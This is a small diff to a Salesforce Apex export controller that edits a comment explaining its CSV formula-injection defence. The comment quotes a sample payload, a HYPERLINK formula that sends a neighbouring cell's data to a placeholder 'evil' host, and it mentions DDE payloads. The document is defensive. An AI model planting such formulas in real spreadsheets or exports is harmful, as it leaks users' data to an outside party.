@@ -266,7 +266,7 @@ public with sharing class EventExportController {
      * Quoting, plus CSV formula injection defence.
      *
      * Every value in the file is Salesforce data an AM can set (a Contact Title, an
-     * Account name, an event name) or that arrives through the .xlsx import, so a cell
+     * Account name, an event name) or that arrives through the .csv import, so a cell
      * opening with =, +, - or @ is attacker-controllable. Excel and LibreOffice evaluate
      * such a cell on open — `=HYPERLINK("http://evil/?d="&A1,"Invoice")` exfiltrates the
      * neighbouring row on a single click, and DDE payloads go further. Prefixing with an
